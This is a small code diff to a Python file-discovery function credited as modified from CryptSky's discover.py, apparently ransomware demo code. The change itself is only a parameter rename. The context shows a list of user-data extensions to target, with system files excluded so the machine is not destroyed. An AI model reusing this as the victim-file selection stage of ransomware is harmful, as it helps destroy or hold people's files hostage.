@@ -4,8 +4,8 @@ import os
 #Script to get file paths from the computer
 #Modified from https://github.com/deadPix3l/CryptSky/blob/master/discover.py
 
-def findFiles(path):
 
+def findFiles(startpath):
 	 extensions = [
         # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
         'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
@@ -33,5 +33,3 @@ def findFiles(path):
 	            ext = absolute_path.split('.')[-1]
 	            if ext in extensions:
 	                yield absolute_path
-
-	
